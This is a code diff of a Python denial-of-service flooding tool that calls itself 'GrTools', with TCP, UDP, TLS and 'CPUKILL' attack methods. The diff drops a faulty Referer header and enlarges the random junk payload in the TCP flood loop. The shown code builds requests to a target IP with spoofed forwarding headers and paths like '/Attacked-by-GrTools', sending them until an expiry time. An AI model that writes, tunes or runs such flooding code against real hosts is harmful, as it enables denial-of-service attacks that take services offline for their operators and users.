@@ -53,22 +53,19 @@ else:
     print("METHOD INVALID!")
     time.sleep(2000)
 
-referers = ["""Server Got Attacked!"""]
-
 def Headers(method):
     header = ""
     if method == "TCP" or method == "UDP" or method == "TLS" or method == "CPUKILL":
         post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
         connection = "Connection: Keep-Alive\r\n"
         content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
-        referers = "Referers: " + random.choice(referers) + ip + "\r\n"
         connection += "Cache-Control: max-age=0\r\n"
         connection += "pragma: no-cache\r\n"
         randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
         forward = "X-Forwarded-For: 1\r\n"
         forward += "Client-IP: 10000\r\n"
         length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-        header = post_host + referers + forward + content + connection +  length + "\r\n\r\n"
+        header = post_host + forward + content + connection +  length + "\r\n\r\n"
     return header
 
 def udpby():
@@ -103,7 +100,7 @@ def cpukil():
             s.close()
 
 def tcpfl():
-    grtools = os.urandom(15419) + random._urandom(10414)
+    grtools = os.urandom(15419) + random._urandom(60404)
     while datetime.datetime.now() < expiration_date:
         get_host = "GET /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
         request  = get_host + Headers(method) + "\r\n"
